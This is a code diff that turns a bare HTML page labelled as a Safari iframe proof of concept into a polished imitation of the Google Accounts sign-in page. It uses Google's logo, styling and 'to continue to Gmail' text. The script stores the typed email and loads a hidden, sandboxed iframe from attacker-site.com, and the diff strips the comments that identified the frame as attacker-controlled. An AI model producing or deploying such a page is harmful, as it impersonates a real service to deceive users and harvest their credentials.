@@ -1,20 +1,81 @@
 <!DOCTYPE html>
-<html>
-<head><title>Safari iframe PoC</title></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Sign in – Google Accounts</title>
+  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
+  <style>
+    body {
+      font-family: Roboto, sans-serif;
+      background: #f2f2f2;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
+      width: 360px;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .logo img {
+      width: 75px;
+    }
+    h1 {
+      font-size: 22px;
+      font-weight: normal;
+      color: #202124;
+    }
+    input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 20px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    button {
+      margin-top: 30px;
+      width: 100%;
+      padding: 10px;
+      background: #1a73e8;
+      color: white;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+    button:hover {
+      background: #1765d1;
+    }
+  </style>
+</head>
 <body>
-  <h3>Sign in to continue</h3>
-  <input type="email" id="emailInput" placeholder="Enter your email" />
-  <button onclick="proceed()">Login</button>
+  <div class="container">
+    <div class="logo">
+      <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
+    </div>
+    <h1>Sign in</h1>
+    <p>to continue to Gmail</p>
+    <input type="email" id="emailInput" placeholder="Email or phone" autocomplete="email" />
+    <button onclick="next()">Next</button>
+  </div>
 
   <script>
-    function proceed() {
+    function next() {
       const email = document.getElementById("emailInput").value;
-      localStorage.setItem("iframe_safari_poc", email);
+      if (!email) return;
+      localStorage.setItem("google_login_email", email);
 
-      // Load sandboxed iframe (attacker-controlled)
       const iframe = document.createElement("iframe");
       iframe.src = "https://attacker-site.com/frame.html";
-      iframe.sandbox = "allow-scripts allow-forms";  // ⚠️ intentionally restricted
+      iframe.sandbox = "allow-scripts allow-forms";
       iframe.style.display = "none";
       document.body.appendChild(iframe);
     }
